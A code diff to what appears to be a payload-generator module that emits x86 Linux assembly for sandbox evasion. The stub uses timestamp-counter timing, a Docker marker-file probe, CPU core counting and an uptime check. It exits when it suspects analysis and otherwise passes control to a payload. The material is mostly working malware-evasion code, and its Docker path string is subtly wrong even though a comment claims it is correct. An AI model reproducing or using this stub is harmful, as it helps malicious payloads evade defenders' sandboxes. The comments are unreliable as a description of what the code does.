@@ -11,18 +11,18 @@ check_rdtsc:
     xor eax, eax
     cpuid
     rdtsc
-    mov ebx, eax      ; Save low 32 bits of timestamp
+    mov edi, eax      ; SAVE timestamp in EDI (cpuid doesn't touch EDI)
 
     xor eax, eax
-    cpuid
+    cpuid             ; This clobbers EAX, EBX, ECX, EDX
 
     rdtsc
-    sub eax, ebx      ; Calculate delta
+    sub eax, edi      ; Calculate delta (Current - Saved)
     
     xor ecx, ecx
     mov cx, 0x3E8      ; 1000 cycles
     cmp eax, ecx
-    jge sandbox_detected   ; EXIT IF CYCLES >= 1000
+    jge sandbox_detected
       ^
     end
 
@@ -30,41 +30,36 @@ check_rdtsc:
     if check_docker
       docker_asm = %Q^
 ; ─────────────────────────────────────────────────────────────
-; Check: Container Detection via /.dockerenv existence
+; Check: Container Detection via /.dockerenv
 ; ─────────────────────────────────────────────────────────────
 check_docker:
-    ; Push "/.dockerenv\0" to stack (Little Endian)
-    ; 2f 2e 64 6f | 63 6b 65 72 | 65 6e 76 00
     xor eax, eax
-    push eax              ; Null terminator
+    push eax              ; Null terminator \0
     push 0x6e766572       ; "revn"
     push 0x6b636f64       ; "dock"
-    push 0x6f642e2f       ; ".d/" (Correction for /.dockerenv)
+    push 0x6f642e2f       ; ".do/" (This results in /.dockerenv\0)
     
-    ; sys_open (x86 syscall 5)
-    mov eax, 5
-    mov ebx, esp          ; Pointer to filename
-    xor ecx, ecx          ; O_RDONLY = 0
+    mov eax, 5            ; sys_open (x86)
+    mov ebx, esp          ; arg1: filename
+    xor ecx, ecx          ; arg2: O_RDONLY
     int 0x80
 
     test eax, eax
-    js clean_docker       ; If return is negative (error), it's not a docker env
-    jmp sandbox_detected  ; If file opened successfully, sandbox detected
+    js clean_docker       ; If error, it's not docker
+    jmp sandbox_detected  ; If success, it IS docker
 
 clean_docker:
-    add esp, 16           ; Clean up string from stack
+    add esp, 16
       ^
     end
 
     asm = %Q^
 _start:
-    ; Save callee-saved registers per x86 convention
     push ebx
     push esi
     push edi
     push ebp
 
-    ; Allocate space on stack for structures
     sub esp, 128
 
 ; ─────────────────────────────────────────────────────────────
@@ -72,16 +67,16 @@ _start:
 ; ─────────────────────────────────────────────────────────────
 check_cores:
     mov eax, 103          ; sys_sched_getaffinity
-    xor ebx, ebx          ; pid = 0 (current process)
-    mov ecx, esp          ; mask pointer
-    mov edx, 128          ; size of mask
+    xor ebx, ebx          ; pid = 0
+    mov ecx, 128          ; size of mask
+    mov edx, esp          ; mask pointer
     int 0x80
     
     test eax, eax
     js check_uptime
     
-    mov ebx, [esp]        ; Load mask
-    xor ecx, ecx          ; Core counter
+    mov ebx, [esp]
+    xor ecx, ecx
 count_loop:
     test ebx, ebx
     jz evaluate_cores
@@ -106,7 +101,6 @@ check_uptime:
     test eax, eax
     js execute_optional_checks
     
-    ; In sysinfo struct, uptime is usually at offset 0 (long)
     mov eax, [esp]
     xor ebx, ebx
     mov bx, #{uptime}
@@ -117,27 +111,25 @@ execute_optional_checks:
 #{rdtsc_asm}
 #{docker_asm}
 
-    jmp pass               ; ALL CHECKS PASSED, JUMP TO PAYLOAD
+    jmp pass
 
 ; ─────────────────────────────────────────────────────────────
 ; Sandbox Detected: Kill Process (x86 syscall 1)
 ; ─────────────────────────────────────────────────────────────
 sandbox_detected:
-    xor eax, eax
-    mov al, 1             ; sys_exit
-    xor ebx, ebx          ; status 0
+    mov eax, 1            ; sys_exit
+    xor ebx, ebx
     int 0x80
 
 ; ─────────────────────────────────────────────────────────────
 ; Clean Up & Execute
 ; ─────────────────────────────────────────────────────────────
 pass:
-    add esp, 128           ; Restore stack pointer
+    add esp, 128
     xor eax, eax
     xor ecx, ecx
     xor edx, edx
 
-    ; Restore callee-saved registers
     pop ebp
     pop edi
     pop esi
